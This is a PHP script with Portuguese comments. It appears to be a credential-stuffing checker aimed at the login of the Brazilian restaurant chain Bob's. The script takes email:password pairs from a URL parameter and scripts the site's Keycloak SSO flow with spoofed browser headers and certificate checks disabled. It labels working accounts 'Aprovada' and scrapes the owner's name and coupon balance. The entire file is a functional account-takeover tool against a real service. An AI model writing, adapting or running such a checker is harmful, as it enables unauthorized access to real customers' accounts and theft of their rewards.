l<?php
// api.php - SOMENTE A LÓGICA DA API

// ATENÇÃO: Removi o error_reporting(0) para podermos ver os erros durante o teste.
// ini_set('display_errors', 1);
// error_reporting(E_ALL);

date_default_timezone_set('America/Sao_Paulo');

// --- CONFIGURAÇÕES E FUNÇÃO CURL ---
$site_config = [
    'start_url' => 'https://bobs.com.br/accounts/keycloak/login/?process=login',
    'headers' => [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ]
];

function executeCurl(&$cookie_string, $url, $method = 'GET', $postData = null, $referer = null) {
    global $site_config;
    $ch = curl_init();
    $headers = $site_config['headers'];
    if ($referer) { $headers[] = 'Referer: ' . $referer; }
    if ($method === 'POST') {
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Origin: https://sso.bobs.com.br';
    }
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15); // Reduzi o timeout para 15s, mais seguro para serverless
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    if (!empty($cookie_string)) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
    }
    if ($method === 'POST' && $postData) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    }
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $response_headers = substr($response, 0, $header_size);
    $response_body = substr($response, $header_size);
    curl_close($ch);
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response_headers, $matches);
    if (!empty($matches[1])) {
        $cookies_array = empty($cookie_string) ? [] : explode('; ', $cookie_string);
        $new_cookies = $matches[1];
        foreach ($new_cookies as $new_cookie) {
            list($name) = explode('=', $new_cookie, 2);
            $cookies_array = array_filter($cookies_array, function($c) use ($name) {
                return strpos($c, $name . '=') !== 0;
            });
        }
        $cookie_string = implode('; ', array_merge($cookies_array, $new_cookies));
    }
    return [
        'http_code' => $http_code, 'response_headers' => $response_headers, 'response_body' => $response_body
    ];
}

// --- LÓGICA PRINCIPAL ---
$lista = $_GET['lista'] ?? '';
if (empty($lista)) { die("Reprovada ❌ Nenhuma lista fornecida."); }
$partes = preg_split('/[|:]/', $lista, 2);
$email = trim($partes[0] ?? '');
$senha = trim($partes[1] ?? '');
if (empty($email) || empty($senha)) { die("Reprovada ❌ $lista => Formato inválido."); }
$cookies = '';
$startResult = executeCurl($cookies, $site_config['start_url'], 'GET', null, 'https://www.bobs.com.br/');
preg_match('/^Location:\s*(.*)$/mi', $startResult['response_headers'], $locationMatches);
$ssoUrl = trim($locationMatches[1] ?? '');
if ($startResult['http_code'] !== 302 || empty($ssoUrl)) { die("Reprovada ❌ Falha ao obter URL de SSO."); }
$ssoPageResult = executeCurl($cookies, $ssoUrl, 'GET', null, 'https://www.bobs.com.br/');
preg_match('/<form id="kc-form-login" .*? action="(.*?)"/s', $ssoPageResult['response_body'], $actionMatches);
$authenticateUrl = html_entity_decode($actionMatches[1] ?? '');
if (empty($authenticateUrl)) { die("Reprovada ❌ Falha ao encontrar formulário de login."); }
$loginData = ['username' => $email, 'password' => $senha, 'credentialId' => ''];
$loginResult = executeCurl($cookies, $authenticateUrl, 'POST', $loginData, $ssoUrl);
if ($loginResult['http_code'] !== 302) { die("Reprovada ❌ Credenciais inválidas."); }
preg_match('/^Location:\s*(.*)$/mi', $loginResult['response_headers'], $callbackMatches);
$callbackUrl = trim($callbackMatches[1] ?? '');
if (empty($callbackUrl)) { die("Reprovada ❌ Login OK, mas falha no callback."); }
$callbackResult = executeCurl($cookies, $callbackUrl, 'GET', null, $ssoUrl);
preg_match('/^Location:\s*(.*)$/mi', $callbackResult['response_headers'], $finalRedirectMatches);
$finalUrl = trim($finalRedirectMatches[1] ?? 'https://bobs.com.br/perfil/');
$profileResult = executeCurl($cookies, $finalUrl, 'GET', null, $callbackUrl);
$profileUrl = 'https://bobs.com.br/perfil/';
$profileResult = executeCurl($cookies, $profileUrl, 'GET', null, $finalUrl);

// --- EXTRAÇÃO FINAL ---
$profileBody = $profileResult['response_body'];
if ($profileResult['http_code'] === 200) {
    preg_match('/<span class="name">(.*?)<\/span>/', $profileBody, $nameMatches);
    $nome = trim($nameMatches[1] ?? 'N/A');
    preg_match('/<div class="">Cupons:<\/div>\s*<div class="">(\d+)<\/div>/', $profileBody, $couponMatches);
    $cupons = trim($couponMatches[1] ?? 'N/A');
    die("Aprovada ✅ $lista | Nome: $nome | Cupons: $cupons");
} else {
    die("Reprovada ❌ Login OK, mas falha ao carregar o perfil (HTTP: {$profileResult['http_code']}).");
}
?>
